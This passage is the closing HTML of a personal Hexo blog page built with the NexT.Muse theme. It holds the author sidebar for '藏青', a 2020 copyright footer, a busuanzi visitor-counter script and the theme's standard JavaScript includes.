        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">藏青</p>
  <div class="site-description" itemprop="description">知行合一</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">20</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">藏青</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
  </div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.1
  </div>

    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
